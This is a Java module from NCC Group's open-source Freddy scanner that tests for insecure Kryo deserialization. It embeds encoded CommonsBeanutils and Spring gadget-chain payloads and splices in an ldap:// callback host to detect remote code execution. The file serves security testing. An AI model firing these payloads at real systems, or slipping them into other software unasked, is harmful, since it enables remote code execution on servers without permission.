// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java Kryo library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class KryoModule extends FreddyModuleBase {
    //CommonsBeanutils payload data
    private static final int COMBU_PAYLOAD_CMD_OFFSET = 169;
    private final String COMBU_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/dIovOEMb2UXhsbPF13MsKI5LwrQLOknpJrVsOdLikpywIM5LDBhnjo5g3CcMTJDGuOEIZPjUoMFVdn2G3TiMq4qat5zRhchxgDoAmHn4FuITsU3FXRJXu+nAJhiTCZm/5vLk8GfQrPL2WFPdArm4vwUKbppAHPZjscpEYl51bygh4ij6Zh3zGrFxBUEJIuWpsChBdcQBgPNKs3ZOQtXe0FE+nHpl40tN/b71qvXNfJvVLB8TQ0bF4fbVlF/g0N7rSYOK8Pcs+87Vtz/3wOHYZlVunzpfDOX/OMgFdzzEJr+");
    private final String COMBU_SUFFIX_B64 = decrypt("ApuLKJge7IuZmeKcs6ZsDTlwyB5k9EJudkhtIzMiX1UnMbhEwnw30Vb1zzNzbxwWbcA8j+RLm4Dw6nBIJxsGD6ptWjEkYtkIJclW5UjM2pYxhtHicPQ4nsga0Ui9qrplvZdNFtbK6bRGQ2joJlRI237ZQAR6REIwIFyCw7t0ZQul64Fu49ptwh4Kb7/+P5YHF7El8L5+6SIUonwRgHaGTQ==");
    //SpringAbstractBeanFactory payload data
    private static final int SABF_PAYLOAD_CMD_OFFSET = 94;
    private final String SABF_PREFIX_B64 = decrypt("4gLTvsDH9t4ak6BOhUoP/ZIaG5dkTz6cmL66CNE34n7UiXwedE29Tf/9/CLRC1lgLZnVps9jXup3qpb/pcpq+WDKRTbNA9Pl+d4NfA/OKelPaJJ2v0zlurVH4m9roZxYorPpbo1I/RObbOszzkkD5JU6fA33Il9vLmaC9yE34hvlEA0nSyb71KkLems0gAqB");
    private final String SABF_SUFFIX_B64 = decrypt("yS0hqE0S0vrK3wj/UpkwrM4UIrywz6ncDyLKhq78NhmBBJxq9wWs8djKkG28O8uMnpIP3twjXp+dYev1dyC4lS8g9J7RrLfGT2qE9+UjlxyOAkIH/dsO2ysuXYKaXnIn50+gP1Gu+VIp8SZbBlo5wH3nMD1nHxypgjpWrXVTlJSVrahMm/vewuthAkxKFOoiH4+Dr4vO8TNYuZ/H1u0Mj8n63EcN73mL3BS8lkZVIrI6AB0HJHWthWZIJeXsD2brfBidSxZ0jQDVzNOa5JYmU1sI2ntHOR+Axlrzl38VSiXhmcU8nsJbO5LAz5aCFSOOSJjkCzXpRAyVbUc6DGxhaHPQPwbSEMOucRZf2uLwGZ2iVUhlAFSK9yckrn/ons84Y1VA+iquypedcCLZoKkkaR6AHv80PvEyWlJ5CtPhxZU=");
    private byte[] COMBU_PAYLOAD;
    private byte[] SABF_PAYLOAD;

    protected void initialiseModule() {
        setName("Kryo");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        COMBU_PAYLOAD = buildBinaryPayloadBuffer(COMBU_PREFIX_B64, COMBU_SUFFIX_B64, false);
        SABF_PAYLOAD = buildBinaryPayloadBuffer(SABF_PREFIX_B64, SABF_SUFFIX_B64, false);

        //Register active scan payloads (passive scan is handled by KryoPassiveDetectionModule)
        registerActiveScanExceptionPayload(new byte[]{0x04}, "com.esotericsoftware.kryo.KryoException");

        registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_COMBEANUTILS:
                return generateBinaryPayload(COMBU_PAYLOAD, COMBU_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGABF:
                return generateBinaryPayload(SABF_PAYLOAD, SABF_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);
        }
        return null;
    }
}
